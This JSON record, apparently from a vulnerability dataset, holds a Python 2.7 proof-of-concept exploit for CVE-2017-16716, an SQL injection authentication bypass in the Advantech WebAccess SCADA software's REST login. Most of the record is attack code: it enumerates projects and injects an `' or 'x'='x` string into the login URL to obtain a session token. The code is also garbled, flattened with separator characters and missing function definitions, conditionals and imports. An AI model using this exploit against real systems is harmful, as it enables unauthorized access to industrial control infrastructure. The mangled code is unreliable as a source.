{
    "text": "vul_name : Advantech WebAccess 8.0-2015.08.16 SQL Injection ， vul_cve : CVE-2017-16716 ， vul_poc :  #  ! /usr/bin/python2.7 ，  # Exploit Title : Advantech WebAccess BWSCADARest Login Method SQL Injection Authentication Bypass Vulnerability ，  # Date : 01-13-2018 ，  # Exploit Author : Chris Lyne (  @ lynerc )  ，  # Vendor Homepage : www.advantech.com ，  # Software Link :  ，  # Version : Advantech WebAccess 8.0-2015.08.16 ，  # Tested on : Windows Server 2008 R2 Enterprise 64-bit ，  # CVE : CVE-2017-16716 ，  # See Also :  ，  # Notes :  ，  # There are two service interfaces :  ，  # 1 ) SOAP ，  # 2 ) REST ，  # This PoC targets REST ，  # The web services did not work out of the box , and a new website/app was created in IIS for testing. ，  # This issue was potentially due to the fact that testing was completed against a trial version. ，  # PoC may need slight tweaks depending on configuration of the web service. ，  # Original vulnerability was reported for more recent software version. ，  # This WebAccessAuthBypass class can be imported : - )  ， from xml.etree import ElementTree ， self.ip = ip ， self.port = port ， self.base_url = \" % ( ip , port )  ， print 'Getting list of projects.' ， res = requests.get ( self.base_url )  ， projects = list (  )  ， print 'Bad HTTP response.' ， print 'No projects listed by service.' ， s = self.convert_entities ( res.text )  ， xml = ElementTree.fromstring ( s )  ， name = project.get ( 'NAME' )  ， projects.append ( name )  ， print 'Found the following projects : ' + str ( projects )  ，  # returns a token ，  # SQL Injection into the user parameter ， url = self.base_url + \"Login/\" + project + \"/notadmin'%20or%20'x'%3D'x/nopass\" # notadmin' or 'x'='x ， res = requests.get ( url )  ， token = None ， print 'Bad HTTP response.' ， print 'No token returned by service.' ， s = self.convert_entities ( res.text )  ， xml = ElementTree.fromstring ( s )  ， token = xml [ 0 ] .get ( 'TOKEN' )  ，  # token returned can be used for more transactions ， project_list = self.get_project_list (  )  ， project = project_list [ 0 ]  # might as well pick the first project ， token = self.login ( project_list [ 0 ]  )  ， ip = 'targetip' ， port = 'port # ' ， bypass = WebAccessAuthBypass ( ip , port )  ， token = bypass.get_token (  )  ， print 'Successfully got an authentication token : ' + token ， print 'Unsuccessful.'",
    "time": "2018.01.31"
}